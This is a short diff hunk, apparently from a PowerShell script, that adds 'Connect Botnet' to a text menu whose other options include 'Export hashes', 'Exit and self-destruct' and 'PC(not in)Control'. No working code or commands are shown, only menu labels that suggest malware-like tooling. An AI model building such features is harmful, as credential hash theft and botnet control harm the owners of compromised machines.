@@ -5,7 +5,7 @@ $message = @"
     CHOOSE ACTIONS:
     0 - Exit and self-destruct
     1 - Export hashes
-    2 - 
+    2 - Connect Botnet
     3 - 
     4 - PC(not in)Control
 =================================
